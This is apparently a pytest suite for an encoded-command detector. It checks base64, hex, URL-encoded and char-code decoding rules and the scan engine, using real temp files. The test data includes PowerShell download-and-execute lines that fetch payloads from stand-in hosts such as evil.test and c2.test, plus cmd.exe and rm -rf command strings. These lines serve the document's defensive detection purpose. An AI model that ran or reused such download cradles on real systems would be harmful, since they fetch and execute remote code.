"""Tests for the Security Engine and Detection Rules — run against REAL
temp files written to disk during the test (real base64/hex/URL encoding,
real decoding, no mocking of the decode path)."""
import base64
import os
import shutil
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.security_engine import EncodedCommandDetector, analyze_text
from app.detection_rules import (
    rule_base64_suspicious_keyword,
    rule_base64_binary_payload,
    rule_hex_suspicious_keyword,
    rule_urlencoded_suspicious_keyword,
    rule_charcode_obfuscation_technique,
    rule_undecodable_candidate,
)

# --------------------------------------------------------------------- #
# Rule-level unit tests (pure functions, no filesystem involved)
# --------------------------------------------------------------------- #
def test_rule_base64_suspicious_keyword_matches():
    result = rule_base64_suspicious_keyword("QQ==", "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a')")
    assert result is not None
    assert result["rule_id"] == "ECD-001"
    assert result["severity"] == "critical"
    assert "downloadstring" in result["description"].lower() or "iex" in result["description"].lower()


def test_rule_base64_suspicious_keyword_no_match_returns_none():
    assert rule_base64_suspicious_keyword("QQ==", "just some harmless decoded text") is None
    assert rule_base64_suspicious_keyword("QQ==", None) is None


def test_rule_base64_binary_payload():
    result = rule_base64_binary_payload("somecandidate==", None, True)
    assert result["rule_id"] == "ECD-002"
    assert result["severity"] == "high"
    assert rule_base64_binary_payload("cand", "printable text", False) is None


def test_rule_hex_suspicious_keyword():
    result = rule_hex_suspicious_keyword("63:6d:642e:657865", "cmd.exe /c whoami")
    assert result["rule_id"] == "ECD-003"
    assert result["severity"] == "high"
    assert rule_hex_suspicious_keyword("aabbcc", "nothing interesting") is None


def test_rule_urlencoded_suspicious_keyword():
    result = rule_urlencoded_suspicious_keyword("%68%74%74%70", "http://evil.test/payload")
    assert result["rule_id"] == "ECD-004"
    assert result["severity"] == "medium"
    assert rule_urlencoded_suspicious_keyword("%61%62", "ab") is None


def test_rule_charcode_obfuscation_technique():
    result = rule_charcode_obfuscation_technique("[char]104+[char]105", "hi")
    assert result["rule_id"] == "ECD-005"
    assert result["severity"] == "medium"
    assert rule_charcode_obfuscation_technique("[char]104", None) is None


def test_rule_undecodable_candidate():
    result = rule_undecodable_candidate("aGVsbG8xMjM0NTY3ODkw", "base64")
    assert result["rule_id"] == "ECD-006"
    assert result["severity"] == "low"
    assert rule_undecodable_candidate("x", "not-a-real-kind") is None


# --------------------------------------------------------------------- #
# analyze_text() — pure text-blob analysis, real decode logic
# --------------------------------------------------------------------- #
def test_analyze_text_flags_real_base64_iex_payload():
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://malicious.test/payload.ps1')"
    encoded = base64.b64encode(payload.encode("utf-16le")).decode("ascii")
    text = f"powershell.exe -EncodedCommand {encoded}"

    findings = analyze_text(text)
    ecd001 = [f for f in findings if f["rule_id"] == "ECD-001"]
    assert len(ecd001) >= 1
    assert "downloadstring" in ecd001[0]["description"].lower()
    assert "malicious.test" in ecd001[0]["permissions_octal"] or "DownloadString" in ecd001[0]["permissions_octal"]


def test_analyze_text_flags_real_hex_encoded_suspicious_string():
    payload = "cmd.exe /c calc.exe"
    encoded = payload.encode("utf-8").hex()
    text = f"raw_command_hex={encoded}"

    findings = analyze_text(text)
    ecd003 = [f for f in findings if f["rule_id"] == "ECD-003"]
    assert len(ecd003) >= 1
    assert "cmd.exe" in ecd003[0]["permissions_octal"].lower()


def test_analyze_text_flags_real_urlencoded_suspicious_string():
    # Fully percent-encode every character so the contiguous %XX%XX... regex
    # (as opposed to a normal URL with a handful of scattered %20s) matches.
    payload = "cmd.exe /c http://evil.test/a"
    encoded = "".join(f"%{ord(c):02X}" for c in payload)
    text = f"request_line={encoded}"

    findings = analyze_text(text)
    ecd004 = [f for f in findings if f["rule_id"] == "ECD-004"]
    assert len(ecd004) >= 1
    assert "cmd.exe" in ecd004[0]["permissions_octal"].lower()


def test_analyze_text_flags_real_charcode_array_decoding_to_meaningful_string():
    # JavaScript String.fromCharCode(...) genuinely decoding to "cmd.exe"
    codes = ",".join(str(ord(c)) for c in "cmd.exe")
    text = f"eval(String.fromCharCode({codes}))"

    findings = analyze_text(text)
    ecd005 = [f for f in findings if f["rule_id"] == "ECD-005"]
    assert len(ecd005) >= 1
    assert "cmd.exe" in ecd005[0]["permissions_octal"]


def test_analyze_text_random_base64_shaped_garbage_not_flagged_as_ecd001():
    # A real base64-shaped string that decodes to non-printable garbage bytes
    # (30 raw bytes -> a comfortably long base64 string well over 20 chars).
    garbage = bytes([0, 1, 2, 3, 250, 251, 252, 253, 254, 255, 10, 20, 30, 40, 50] * 2)
    encoded = base64.b64encode(garbage).decode("ascii")
    text = f"blob={encoded}"

    findings = analyze_text(text)
    assert not any(f["rule_id"] == "ECD-001" for f in findings)
    # Non-printable decode -> should be classified as a binary payload (ECD-002),
    # never as a confirmed suspicious keyword match.
    rule_ids = {f["rule_id"] for f in findings}
    assert rule_ids.issubset({"ECD-002", "ECD-006"})


def test_analyze_text_hash_like_hex_not_flagged_as_suspicious():
    # A real SHA-256-style hex digest: decodes to non-UTF8 bytes, should not
    # produce an ECD-003 (confirmed keyword) finding.
    import hashlib
    digest = hashlib.sha256(b"just some random content").hexdigest()
    text = f"checksum={digest}"

    findings = analyze_text(text)
    assert not any(f["rule_id"] == "ECD-003" for f in findings)


# --------------------------------------------------------------------- #
# Engine-level tests — real temp files on disk, real ScanEngine.run()
# --------------------------------------------------------------------- #
def test_engine_scans_single_file_with_base64_iex_payload():
    tmpdir = tempfile.mkdtemp()
    try:
        payload = "IEX (New-Object Net.WebClient).DownloadString('http://c2.test/x')"
        encoded = base64.b64encode(payload.encode("utf-16le")).decode("ascii")
        target = os.path.join(tmpdir, "suspicious.ps1")
        with open(target, "w") as f:
            f.write(f"powershell -EncodedCommand {encoded}\n")

        engine = EncodedCommandDetector(target)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "ECD-001" in rule_ids
        assert result["files_scanned"] == 1
        assert result["errors_count"] == 0
    finally:
        shutil.rmtree(tmpdir)


def test_engine_walks_directory_and_finds_hex_payload():
    tmpdir = tempfile.mkdtemp()
    try:
        payload = "/bin/sh -c 'rm -rf /tmp/x'"
        encoded = payload.encode("utf-8").hex()
        target = os.path.join(tmpdir, "notes.log")
        with open(target, "w") as f:
            f.write(f"hex_dump={encoded}\n")

        engine = EncodedCommandDetector(tmpdir, max_depth=3)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "ECD-003" in rule_ids
        assert result["dirs_scanned"] >= 1
        assert result["files_scanned"] >= 1
    finally:
        shutil.rmtree(tmpdir)


def test_engine_scans_csv_export_commandline_column():
    tmpdir = tempfile.mkdtemp()
    try:
        payload = "IEX (New-Object Net.WebClient).DownloadString('http://c2.test/payload')"
        encoded = base64.b64encode(payload.encode("utf-16le")).decode("ascii")
        target = os.path.join(tmpdir, "events.csv")
        with open(target, "w", newline="") as f:
            f.write("Timestamp,CommandLine\n")
            f.write(f'2026-01-01T00:00:00,"powershell -enc {encoded}"\n')
            f.write('2026-01-01T00:01:00,"notepad.exe C:\\\\a.txt"\n')

        engine = EncodedCommandDetector(target)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "ECD-001" in rule_ids
        assert result["files_scanned"] == 2  # two data rows
    finally:
        shutil.rmtree(tmpdir)


def test_engine_clean_file_produces_no_findings():
    tmpdir = tempfile.mkdtemp()
    try:
        target = os.path.join(tmpdir, "clean.txt")
        with open(target, "w") as f:
            f.write("This is a perfectly ordinary log line with nothing encoded in it.\n")

        engine = EncodedCommandDetector(target)
        result = engine.run()
        assert result["findings"] == []
        assert result["errors_count"] == 0
    finally:
        shutil.rmtree(tmpdir)


def test_engine_random_base64_shaped_string_not_flagged_as_confirmed_malicious():
    tmpdir = tempfile.mkdtemp()
    try:
        garbage = bytes([b for b in range(0, 255, 5)])  # long, non-printable byte run
        encoded = base64.b64encode(garbage).decode("ascii")
        target = os.path.join(tmpdir, "randomid.txt")
        with open(target, "w") as f:
            f.write(f"session_token={encoded}\n")

        engine = EncodedCommandDetector(target)
        result = engine.run()

        assert not any(f["rule_id"] == "ECD-001" for f in result["findings"])
    finally:
        shutil.rmtree(tmpdir)


def test_engine_nonexistent_path_counts_as_error_not_crash():
    engine = EncodedCommandDetector("/this/path/does/not/exist/at/all")
    result = engine.run()
    assert result["errors_count"] >= 1
    assert result["findings"] == []


def test_engine_excluded_paths_are_skipped():
    tmpdir = tempfile.mkdtemp()
    try:
        excluded = os.path.join(tmpdir, "excluded")
        os.mkdir(excluded)
        payload = "cmd.exe /c calc"
        encoded = payload.encode("utf-8").hex()
        bad_file = os.path.join(excluded, "bad.log")
        with open(bad_file, "w") as f:
            f.write(f"x={encoded}\n")

        engine = EncodedCommandDetector(tmpdir, max_depth=3, excludes=[excluded])
        result = engine.run()
        assert all(excluded not in f["file_path"] for f in result["findings"])
    finally:
        shutil.rmtree(tmpdir)
